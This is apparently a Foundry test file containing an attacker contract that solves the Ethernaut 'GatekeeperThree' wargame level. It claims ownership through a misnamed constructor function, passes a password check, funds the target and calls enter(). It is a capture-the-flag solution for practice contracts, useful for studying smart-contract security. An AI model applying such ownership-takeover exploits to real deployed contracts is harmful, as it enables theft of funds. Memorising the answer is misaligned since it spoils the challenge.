// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {GatekeeperThree} from "../../src/ethernaut/28_GatekeeperThree/GatekeeperThree.sol";

contract GatekeeperThree_Attacker {
	address player;
	GatekeeperThree coreInst;
	
	constructor(GatekeeperThree coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	// receive() external payable {}
	
	function doAttack(uint256 passwordUint) public {
		coreInst.getAllowance(passwordUint);
		coreInst.construct0r();
		address(coreInst).call{value: 0.0011 ether}("");
		
		coreInst.enter();
	}
}
